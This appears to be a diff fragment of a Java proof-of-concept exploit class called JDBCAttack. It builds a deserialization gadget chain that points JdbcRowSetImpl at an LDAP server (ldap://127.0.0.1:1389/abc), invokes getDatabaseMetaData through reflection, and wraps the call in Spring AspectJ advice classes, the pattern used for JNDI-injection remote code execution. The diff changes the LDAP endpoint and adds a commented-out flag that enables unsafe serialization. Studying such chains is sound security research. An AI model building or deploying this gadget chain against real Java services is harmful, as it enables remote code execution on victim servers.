@@ -10,9 +10,9 @@ import java.util.*;
 
 public class JDBCAttack {
     public static void main(String[] args) throws Exception {
-
+//        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
         JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
-        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:50389/8a1660");
+        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:1389/abc");
         Method method=jdbcRowSet.getClass().getMethod("getDatabaseMetaData");
         SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(jdbcRowSet);
         AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);
